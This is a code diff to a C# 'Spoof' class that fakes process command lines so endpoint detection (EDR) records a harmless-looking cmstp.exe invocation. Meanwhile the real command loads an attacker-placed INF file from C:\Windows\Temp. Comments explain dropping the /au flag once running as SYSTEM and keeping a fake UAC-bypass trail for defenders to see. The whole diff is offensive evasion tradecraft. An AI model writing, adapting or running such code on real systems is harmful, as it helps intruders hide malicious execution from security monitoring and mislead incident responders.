@@ -115,8 +115,11 @@ public static class Spoof
         // spoofedCmd -> what EDR sees in Win32_Process.CommandLine (PEB-overwritten)
         // Pad realCmd with trailing spaces so its UTF-16 buffer fits the original
         // CommandLine allocation; cmstp's argv parser ignores trailing whitespace.
+        // Drop /au from realCmd: we're already SYSTEM, CMSTPLUA's INF-location
+        // trust check rejects C:\ProgramData\* and the whole step no-ops.
+        // Keep /au in spoofedCmd so the UAC-bypass narrative survives in EDR.
         string spoofedCmd = "cmstp.exe /au /s C:\\Windows\\System32\\cmstp.inf";
-        string realCmd    = "cmstp.exe /au /s C:\\ProgramData\\config.inf    ";
+        string realCmd    = "cmstp.exe /s C:\\Windows\\Temp\\config.inf       ";
 
         STARTUPINFO si = new STARTUPINFO();
         si.cb = Marshal.SizeOf(typeof(STARTUPINFO));
